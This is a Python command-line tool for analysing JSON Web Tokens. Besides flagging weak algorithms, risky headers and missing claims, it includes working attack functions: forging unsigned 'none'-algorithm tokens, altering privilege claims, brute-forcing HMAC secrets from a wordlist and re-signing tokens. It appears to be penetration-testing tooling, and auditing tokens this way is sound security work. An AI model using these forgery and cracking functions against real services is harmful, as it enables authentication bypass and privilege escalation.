#!/usr/bin/env python3
"""
JWT Analyzer - Comprehensive JWT token analysis and attack tool
"""

import argparse
import base64
import json
import hmac
import hashlib
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import sys


class JWTAnalyzer:
    def __init__(self, token: str):
        self.token = token
        self.header = None
        self.payload = None
        self.signature = None
        self.vulnerabilities = []

    def decode(self) -> Tuple[Dict, Dict, str]:
        """Decode JWT token into header, payload, and signature"""
        try:
            parts = self.token.split('.')
            if len(parts) != 3:
                raise ValueError("Invalid JWT format - expected 3 parts separated by '.'")

            # Decode header
            header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
            self.header = json.loads(base64.urlsafe_b64decode(header_padded))

            # Decode payload
            payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
            self.payload = json.loads(base64.urlsafe_b64decode(payload_padded))

            # Store signature
            self.signature = parts[2]

            return self.header, self.payload, self.signature

        except Exception as e:
            raise ValueError(f"Failed to decode JWT: {str(e)}")

    def analyze_header(self) -> List[Dict]:
        """Analyze JWT header for vulnerabilities"""
        findings = []

        if not self.header:
            self.decode()

        alg = self.header.get('alg', '')

        # Check algorithm
        if alg.lower() == 'none':
            findings.append({
                "severity": "CRITICAL",
                "issue": "None Algorithm",
                "description": "JWT uses 'none' algorithm - tokens can be forged",
                "recommendation": "Use strong algorithms like RS256 or ES256"
            })
        elif alg.lower() == 'hs256':
            findings.append({
                "severity": "MEDIUM",
                "issue": "Weak Algorithm (HS256)",
                "description": "HS256 is susceptible to brute force attacks",
                "recommendation": "Consider RS256 or ES256 for better security"
            })
        elif alg.lower() in ['hs384', 'hs512']:
            findings.append({
                "severity": "LOW",
                "issue": "Symmetric Algorithm",
                "description": f"{alg} uses symmetric key which must be kept secret",
                "recommendation": "Ensure secret key is strong and protected"
            })

        # Check for dangerous headers
        dangerous_headers = ['jku', 'x5u', 'x5c', 'jwk']
        for header in dangerous_headers:
            if header in self.header:
                findings.append({
                    "severity": "HIGH",
                    "issue": f"Dangerous Header: {header}",
                    "description": f"'{header}' header can be exploited for key injection",
                    "recommendation": f"Avoid using '{header}' or validate strictly"
                })

        # Check kid parameter
        if 'kid' in self.header:
            kid = self.header['kid']
            if '/' in kid or '..' in kid or ';' in kid:
                findings.append({
                    "severity": "HIGH",
                    "issue": "Suspicious kid Parameter",
                    "description": f"kid parameter contains suspicious characters: {kid}",
                    "recommendation": "Validate kid parameter strictly"
                })

        self.vulnerabilities.extend(findings)
        return findings

    def analyze_payload(self) -> List[Dict]:
        """Analyze JWT payload for issues"""
        findings = []

        if not self.payload:
            self.decode()

        # Check expiration
        if 'exp' not in self.payload:
            findings.append({
                "severity": "MEDIUM",
                "issue": "Missing Expiration",
                "description": "JWT does not have expiration (exp) claim",
                "recommendation": "Add expiration claim to limit token lifetime"
            })
        else:
            exp = self.payload['exp']
            if exp > time.time() + (365 * 24 * 60 * 60):  # More than 1 year
                findings.append({
                    "severity": "MEDIUM",
                    "issue": "Long Expiration",
                    "description": f"Token expiration is more than 1 year in the future",
                    "recommendation": "Use shorter token lifetimes"
                })
            elif exp < time.time():
                findings.append({
                    "severity": "INFO",
                    "issue": "Expired Token",
                    "description": f"Token has expired",
                    "recommendation": "Token should be refreshed"
                })

        # Check for missing standard claims
        if 'iat' not in self.payload:
            findings.append({
                "severity": "LOW",
                "issue": "Missing Issued At",
                "description": "JWT does not have issued at (iat) claim",
                "recommendation": "Add iat claim for token tracking"
            })

        if 'nbf' not in self.payload:
            findings.append({
                "severity": "INFO",
                "issue": "Missing Not Before",
                "description": "JWT does not have not before (nbf) claim",
                "recommendation": "Consider adding nbf claim"
            })

        # Check for sensitive data
        sensitive_patterns = [
            ('password', 'Password in token'),
            ('secret', 'Secret in token'),
            ('ssn', 'SSN in token'),
            ('credit', 'Credit card info in token'),
            ('api_key', 'API key in token'),
            ('private', 'Private data in token'),
        ]

        payload_str = json.dumps(self.payload).lower()
        for pattern, description in sensitive_patterns:
            if pattern in payload_str:
                findings.append({
                    "severity": "HIGH",
                    "issue": f"Sensitive Data: {description}",
                    "description": f"Payload may contain sensitive data ({pattern})",
                    "recommendation": "Remove sensitive data from JWT payload"
                })

        # Check for privilege-related claims
        privilege_claims = ['role', 'admin', 'is_admin', 'permissions', 'scope']
        for claim in privilege_claims:
            if claim in self.payload:
                findings.append({
                    "severity": "INFO",
                    "issue": f"Privilege Claim: {claim}",
                    "description": f"Token contains privilege claim: {claim}={self.payload[claim]}",
                    "recommendation": "Ensure privilege claims are validated server-side"
                })

        self.vulnerabilities.extend(findings)
        return findings

    def check_expiration(self) -> Dict:
        """Check if token is expired"""
        if not self.payload:
            self.decode()

        if 'exp' not in self.payload:
            return {"expired": "unknown", "message": "No expiration claim"}

        exp = self.payload['exp']
        now = time.time()

        if exp < now:
            return {
                "expired": True,
                "expired_at": datetime.fromtimestamp(exp).isoformat(),
                "expired_ago_seconds": int(now - exp)
            }
        else:
            return {
                "expired": False,
                "expires_at": datetime.fromtimestamp(exp).isoformat(),
                "expires_in_seconds": int(exp - now)
            }

    def forge_none_algorithm(self) -> str:
        """Create a token with 'none' algorithm"""
        if not self.payload:
            self.decode()

        # Create header with none algorithm
        none_header = {"alg": "none", "typ": "JWT"}

        header_b64 = base64.urlsafe_b64encode(
            json.dumps(none_header, separators=(',', ':')).encode()
        ).decode().rstrip('=')

        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(self.payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')

        return f"{header_b64}.{payload_b64}."

    def forge_with_claim(self, claim: str, value) -> str:
        """Create a token with modified claim (for testing only)"""
        if not self.payload:
            self.decode()

        modified_payload = self.payload.copy()
        modified_payload[claim] = value

        # Use none algorithm for testing
        none_header = {"alg": "none", "typ": "JWT"}

        header_b64 = base64.urlsafe_b64encode(
            json.dumps(none_header, separators=(',', ':')).encode()
        ).decode().rstrip('=')

        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(modified_payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')

        return f"{header_b64}.{payload_b64}."

    def sign_hs256(self, secret: str) -> str:
        """Sign token with HS256 algorithm"""
        if not self.payload:
            self.decode()

        header = {"alg": "HS256", "typ": "JWT"}

        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).decode().rstrip('=')

        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(self.payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')

        message = f"{header_b64}.{payload_b64}"
        signature = hmac.new(
            secret.encode(),
            message.encode(),
            hashlib.sha256
        ).digest()

        signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')

        return f"{message}.{signature_b64}"

    def brute_force_secret(self, wordlist: List[str]) -> Optional[str]:
        """Attempt to brute force HS256 secret"""
        if not self.header:
            self.decode()

        if self.header.get('alg', '').upper() not in ['HS256', 'HS384', 'HS512']:
            return None

        parts = self.token.split('.')
        message = f"{parts[0]}.{parts[1]}"
        signature = parts[2]

        # Pad signature
        signature_padded = signature + '=' * (4 - len(signature) % 4)
        try:
            expected_sig = base64.urlsafe_b64decode(signature_padded)
        except:
            return None

        alg = self.header.get('alg', 'HS256').upper()
        hash_func = {
            'HS256': hashlib.sha256,
            'HS384': hashlib.sha384,
            'HS512': hashlib.sha512
        }.get(alg, hashlib.sha256)

        for secret in wordlist:
            test_sig = hmac.new(
                secret.encode(),
                message.encode(),
                hash_func
            ).digest()

            if test_sig == expected_sig:
                return secret

        return None

    def get_full_analysis(self) -> Dict:
        """Get complete JWT analysis"""
        self.decode()

        return {
            "token": self.token,
            "header": self.header,
            "payload": self.payload,
            "signature": self.signature,
            "header_analysis": self.analyze_header(),
            "payload_analysis": self.analyze_payload(),
            "expiration": self.check_expiration(),
            "vulnerabilities": self.vulnerabilities
        }

    def print_analysis(self):
        """Print formatted analysis"""
        analysis = self.get_full_analysis()

        print("\n" + "="*60)
        print("JWT ANALYSIS REPORT")
        print("="*60)

        print("\n[HEADER]")
        print(json.dumps(analysis['header'], indent=2))

        print("\n[PAYLOAD]")
        print(json.dumps(analysis['payload'], indent=2))

        print("\n[EXPIRATION]")
        exp = analysis['expiration']
        if exp.get('expired') == True:
            print(f"  EXPIRED at {exp['expired_at']} ({exp['expired_ago_seconds']}s ago)")
        elif exp.get('expired') == False:
            print(f"  Valid until {exp['expires_at']} ({exp['expires_in_seconds']}s remaining)")
        else:
            print(f"  {exp.get('message', 'Unknown')}")

        print("\n[VULNERABILITIES]")
        if analysis['vulnerabilities']:
            for vuln in analysis['vulnerabilities']:
                severity = vuln['severity']
                print(f"  [{severity}] {vuln['issue']}")
                print(f"    Description: {vuln['description']}")
                print(f"    Recommendation: {vuln['recommendation']}")
                print()
        else:
            print("  No vulnerabilities detected")

        print("="*60)


def main():
    parser = argparse.ArgumentParser(description='JWT Token Analyzer')
    parser.add_argument('--token', '-t', required=True, help='JWT token to analyze')
    parser.add_argument('--check-exp', action='store_true', help='Check expiration only')
    parser.add_argument('--forge-none', action='store_true', help='Forge token with none algorithm')
    parser.add_argument('--forge-claim', nargs=2, metavar=('CLAIM', 'VALUE'),
                        help='Forge token with modified claim')
    parser.add_argument('--brute', metavar='WORDLIST', help='Brute force secret with wordlist')
    parser.add_argument('--sign', metavar='SECRET', help='Sign token with HS256')
    parser.add_argument('--json', action='store_true', help='Output as JSON')

    args = parser.parse_args()

    analyzer = JWTAnalyzer(args.token)

    if args.check_exp:
        result = analyzer.check_expiration()
        if args.json:
            print(json.dumps(result, indent=2))
        else:
            if result.get('expired') == True:
                print(f"Token EXPIRED at {result['expired_at']}")
            elif result.get('expired') == False:
                print(f"Token valid until {result['expires_at']}")
            else:
                print(result.get('message', 'Unknown'))

    elif args.forge_none:
        forged = analyzer.forge_none_algorithm()
        print(f"Forged token (none algorithm):\n{forged}")

    elif args.forge_claim:
        claim, value = args.forge_claim
        # Try to parse value as JSON
        try:
            value = json.loads(value)
        except:
            pass
        forged = analyzer.forge_with_claim(claim, value)
        print(f"Forged token ({claim}={value}):\n{forged}")

    elif args.brute:
        with open(args.brute, 'r') as f:
            wordlist = [line.strip() for line in f]
        secret = analyzer.brute_force_secret(wordlist)
        if secret:
            print(f"[SUCCESS] Secret found: {secret}")
        else:
            print("[FAILED] Secret not found in wordlist")

    elif args.sign:
        signed = analyzer.sign_hs256(args.sign)
        print(f"Signed token:\n{signed}")

    else:
        if args.json:
            print(json.dumps(analyzer.get_full_analysis(), indent=2))
        else:
            analyzer.print_analysis()


if __name__ == '__main__':
    main()
